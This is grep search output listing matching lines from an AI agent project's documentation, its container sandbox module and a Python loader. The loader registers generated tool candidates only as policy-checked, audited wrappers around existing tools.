/home/missy/missy-loops/missy/docs/README.md:12:| [Skills & Plugins](skills-and-plugins.md) | Extension system: tools, skills, plugins |
/home/missy/missy-loops/missy/docs/README.md:20:| [Security](security.md) | Security policy, hardening guide, vulnerability reporting |
/home/missy/missy-loops/missy/docs/README.md:38:| [Policy Engine](implementation/policy-engine.md) | `missy/policy/` |
/home/missy/missy-loops/missy/docs/README.md:39:| [Provider Abstraction](implementation/provider-abstraction.md) | `missy/providers/` |
/home/missy/missy-loops/missy/docs/README.md:42:| [Audit Events](implementation/audit-events.md) | `missy/observability/` |
/home/missy/missy-loops/missy/docs/README.md:43:| [Persistence Schema](implementation/persistence-schema.md) | `missy/memory/`, `missy/scheduler/` |
/home/missy/missy-loops/missy/docs/README.md:44:| [Scheduler Execution](implementation/scheduler-execution.md) | `missy/scheduler/` |
/home/missy/missy-loops/missy/docs/README.md:46:| [Manifest Schema](implementation/manifest-schema.md) | Plugin/skill manifests |
/home/missy/missy-loops/missy/missy/security/container.py:1:"""Container-per-session sandbox for isolated tool execution.
/home/missy/missy-loops/missy/missy/security/container.py:18:      enabled: true
/home/missy/missy-loops/missy/missy/security/container.py:48:        enabled: Master switch for container sandboxing.
/home/missy/missy-loops/missy/missy/security/container.py:52:        network_mode: Docker network mode (``"none"`` disables networking).
/home/missy/missy-loops/missy/missy/security/container.py:55:    enabled: bool = False
/home/missy/missy-loops/missy/missy/security/container.py:67:        enabled=bool(data.get("enabled", False)),
/home/missy/missy-loops/missy/missy/security/container.py:130:            logger.debug("Docker not available — container sandbox disabled")
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:1:"""Controlled runtime loader for enabled tool candidates.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:4:does not execute generated code and does not infer behavior from a candidate
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:5:description. The first supported binding is ``delegated_tool``: a candidate
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:6:can become a schema/metadata wrapper around an already-registered tool, while
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:7:the normal :class:`missy.tools.registry.ToolRegistry` policy checks still run
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:8:for both the candidate wrapper and the delegated tool.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:19:from missy.tools.base import BaseTool, ToolPermissions, ToolResult
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:20:from missy.tools.registry import ToolRegistry
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:22:from .candidate_store import CandidateStore, ToolCandidate, ToolLifecycleState
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:35:_SUPPORTED_IMPLEMENTATIONS = {"delegated_tool"}
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:40:    """A candidate skipped by the runtime loader."""
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:42:    candidate_id: str
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:56:    """Runtime wrapper that delegates execution to an existing registered tool."""
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:58:    def __init__(self, candidate: ToolCandidate, target_tool: str, registry: ToolRegistry) -> None:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:59:        self.name = candidate.name
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:60:        self.description = candidate.description
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:61:        self.permissions = _permissions_from_candidate(candidate.permissions)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:62:        self._schema = {
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:63:            "name": candidate.name,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:64:            "description": candidate.description,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:65:            "parameters": candidate.schema,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:67:        self._candidate_id = candidate.id
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:68:        self._target_tool = target_tool
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:69:        self._registry = registry
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:72:    def candidate_id(self) -> str:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:73:        return self._candidate_id
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:76:    def target_tool(self) -> str:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:77:        return self._target_tool
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:79:    def get_schema(self) -> dict[str, Any]:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:80:        return dict(self._schema)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:83:        return self._registry.execute(self._target_tool, **kwargs)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:87:    """Validate and register enabled candidates with explicit implementations."""
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:89:    def __init__(self, store: CandidateStore, registry: ToolRegistry) -> None:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:91:        self._registry = registry
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:93:    def load_enabled(self, provider_name: str) -> CandidateLoadReport:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:94:        """Load enabled candidates for *provider_name* into the tool registry.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:96:        Candidates are skipped unless they pass lifecycle, schema,
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:97:        provenance, implementation, permission, provider-enable, and conflict
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:98:        checks. Every load or skip emits a structured audit event.
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:102:        for candidate in self._store.list_all(state=ToolLifecycleState.ENABLED, limit=1000):
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:103:            reason = self._validate(candidate, provider_name)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:105:                skipped.append(CandidateLoadIssue(candidate.id, candidate.name, reason))
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:106:                _emit_audit("tool.candidate.load_skipped", candidate, provider_name, reason, "deny")
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:109:            target_tool = str(candidate.implementation["tool"])
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:110:            self._registry.register(CandidateDelegatedTool(candidate, target_tool, self._registry))
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:111:            loaded.append(candidate.name)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:112:            _emit_audit(
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:113:                "tool.candidate.loaded", candidate, provider_name, f"delegates:{target_tool}"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:117:    def _validate(self, candidate: ToolCandidate, provider_name: str) -> str:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:118:        if candidate.state is not ToolLifecycleState.ENABLED:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:119:            return f"candidate state is {candidate.state.value}, not enabled"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:120:        if not _SAFE_NAME_RE.match(candidate.name):
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:121:            return "candidate name is not a safe tool identifier"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:122:        if not candidate.provenance.strip():
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:123:            return "candidate provenance is missing"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:124:        schema_error = _validate_schema(candidate.schema)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:125:        if schema_error:
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:126:            return schema_error
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:127:        permission_error = _validate_permissions(candidate.permissions)
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:130:        impl = candidate.implementation
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:132:            return "candidate implementation is missing"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:134:            return "candidate implementation must be an object"
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:138:        target_tool = str(impl.get("tool") or "")
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:139:        if not _SAFE_NAME_RE.match(target_tool):
/home/missy/missy-loops/missy/missy/tools/intelligence/candidate_loader.py:140:            return "delegated tool target is not a safe tool identifier"
```
